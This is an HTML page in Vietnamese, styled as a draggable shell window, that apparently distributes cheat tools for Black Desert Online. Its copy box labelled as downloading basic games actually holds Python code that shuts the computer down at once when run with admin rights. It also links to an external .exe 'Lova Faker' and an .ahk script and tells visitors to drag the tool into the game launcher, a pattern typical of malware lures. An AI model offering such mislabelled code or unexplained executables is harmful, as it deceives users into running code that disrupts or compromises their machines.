<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Methods V2</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/tailwindcss/2.2.19/tailwind.min.js"></script>
    <style>
        body {
            background-color: #1a202c;
            font-family: 'Segoe UI', 'Arial', sans-serif;
            color: #e2e8f0;
            height: 100vh;
            overflow: hidden;
        }
        .window {
            background-color: #2d3748;
            border-radius: 12px;
            box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -2px rgba(0, 0, 0, 0.05);
            width: 90%;
            max-width: 600px;
            margin: 2rem auto;
            overflow: hidden;
            border: 1px solid #4a5568;
            position: absolute;
            top: 50px;
            left: 50px;
            transition: box-shadow 0.3s ease;
        }
        .window.dragging {
            box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.1), 0 10px 10px -5px rgba(0, 0, 0, 0.04);
            opacity: 0.8;
        }
        .title-bar {
            background-color: #4a5568;
            color: #e2e8f0;
            padding: 0.75rem 1rem;
            display: flex;
            justify-content: space-between;
            align-items: center;
            cursor: move;
            user-select: none;
        }
        .buttons {
            display: flex;
            gap: 0.5rem;
        }
        .button {
            width: 12px;
            height: 12px;
            border-radius: 50%;
            transition: opacity 0.3s;
        }
        .button:hover { opacity: 0.8; }
        .close { background-color: #f56565; }
        .minimize { background-color: #f6e05e; }
        .resize { background-color: #48bb78; }
        .content {
            padding: 1.5rem;
        }
        .copy-area {
            background-color: #4a5568;
            border-radius: 8px;
            padding: 1rem;
            margin-bottom: 1rem;
            font-family: 'Consolas', 'Monaco', monospace;
            white-space: pre-wrap;
            border: 1px solid #718096;
        }
        .copy-button {
            background-color: #4299e1;
            color: white;
            border: none;
            padding: 0.75rem 1.5rem;
            border-radius: 8px;
            cursor: pointer;
            transition: all 0.3s;
            font-weight: bold;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 0.5rem;
        }
        .copy-button:hover {
            background-color: #3182ce;
            transform: translateY(-2px);
            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);
        }
        .copy-button:active {
            transform: translateY(0);
            box-shadow: none;
        }
        .copy-icon {
            width: 18px;
            height: 18px;
            fill: currentColor;
        }
        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }
        .success-message {
            color: #48bb78;
            font-size: 0.875rem;
            margin-top: 0.5rem;
            display: none;
            animation: fadeIn 0.3s ease-in-out;
        }
    </style>
</head>
<body>
    <div class="window" id="draggable">
        <div class="title-bar" id="title-bar">
            <div class="title font-semibold">Shell</div>
            <div class="buttons">
                <div class="button close"></div>
                <div class="button minimize"></div>
                <div class="button resize"></div>
            </div>
        </div>
        <div class="content">
            <h1 class="text-2xl font-bold mb-4">NA EU ( Nên chọn máy chủ này khi tạo tài khoản )!!!</h1>
            
            <div class="copy-area" id="text1">C:\Program Files (x86)\NVIDIA_Grid_Bundle\black_desert_online_pearl_abyss_na_eu\BlackDesert\PERS.exe</div>
            <button class="copy-button" onclick="copyText('text1')">
                <svg class="copy-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor">
                    <path d="M8 3a1 1 0 011-1h2a1 1 0 110 2H9a1 1 0 01-1-1z" />
                    <path d="M6 3a2 2 0 00-2 2v11a2 2 0 002 2h8a2 2 0 002-2V5a2 2 0 00-2-2 3 3 0 01-3 3H9a3 3 0 01-3-3z" />
                </svg>
                COPY
            </button>
            <div class="success-message" id="success-message">Copy Thành Kong!</div>
          
            
           
           
           
           
           <h2 class="text-2xl font-bold mb-4">Tải Vài Game Cơ Bản ( Đang Phát Truyển )!</h2>
            <div class="copy-area" id="text3">import os
import ctypes

# Kiểm tra quyền admin
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except Exception:
        return False

# Tắt máy tính
def shutdown_computer():
    if is_admin():
        os.system("shutdown /s /t 1")  # Tắt máy tính ngay lập tức
    else:
        print("Bạn cần quyền admin để thực hiện hành động này.")

if __name__ == "__main__":
    shutdown_computer()
</div>
            <button class="copy-button" onclick="copyText('text3')">
                <svg class="copy-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor">
                    <path d="M8 3a1 1 0 011-1h2a1 1 0 110 2H9a1 1 0 01-1-1z" />
                    <path d="M6 3a2 2 0 00-2 2v11a2 2 0 002 2h8a2 2 0 002-2V5a2 2 0 00-2-2 3 3 0 01-3 3H9a3 3 0 01-3-3z" />
                </svg>
                COPY
            </button>
            <div class="success-message" id="success-message">Copy Thành Kong!</div>
            
            
            
           <h2 class="text-2xl font-bold mb-4">Cài Mã HotKey </h2>
           
           <a href="https://taimodnow.io.vn/web-game/auto%20nh%E1%BA%A5n%20.ahk" draggable="true" download="" class="button">Download </a>
           
                 <h2 class="text-2xl font-bold mb-4">Tải Tool 27/7/24 ( Kéo Vào Launcher Game )</h2>

           <a href="https://taimodnow.io.vn/web-game/Lova%20Faker.exe" draggable="true" download="LovaFaker.exe" class="button">Tool Mới</a>
           
<h1> Anh có thể mở app ngay ở nút Error Report để chạy app ngay nhé ko cần RUN!</h1>

<p> ẤN DẤU = trên bàn phím kế dấu xóa để click nhanh</p>

        </div>
    </div>
    
    <img src="https://img.upanh.tv/2024/07/19/image79521ee745faf3a9.png" alt="image79521ee745faf3a9.png" border="0">
    <script>
        function copyText(elementId) {
            const text = document.getElementById(elementId).textContent;
            navigator.clipboard.writeText(text).then(() => {
                const successMessage = document.getElementById('success-message');
                successMessage.style.display = 'block';
                setTimeout(() => {
                    successMessage.style.display = 'none';
                }, 2000);
            }).catch(err => {
                console.error('Failed to copy text: ', err);
            });
        }

        const draggable = document.getElementById('draggable');
        const titleBar = document.getElementById('title-bar');

        let isDragging = false;
        let currentX;
        let currentY;
        let initialX;
        let initialY;
        let xOffset = 0;
        let yOffset = 0;

        function dragStart(e) {
            initialX = e.clientX - xOffset;
            initialY = e.clientY - yOffset;

            if (e.target === titleBar) {
                isDragging = true;
                draggable.classList.add('dragging');
            }
        }

        function dragEnd(e) {
            initialX = currentX;
            initialY = currentY;

            isDragging = false;
            draggable.classList.remove('dragging');
        }

        function drag(e) {
            if (isDragging) {
                e.preventDefault();
                currentX = e.clientX - initialX;
                currentY = e.clientY - initialY;

                xOffset = currentX;
                yOffset = currentY;

                setTranslate(currentX, currentY, draggable);
            }
        }

        function setTranslate(xPos, yPos, el) {
            el.style.transform = `translate3d(${xPos}px, ${yPos}px, 0)`;
        }

        titleBar.addEventListener('mousedown', dragStart, false);
        document.addEventListener('mouseup', dragEnd, false);
        document.addEventListener('mousemove', drag, false);
    </script>
</body>
</html>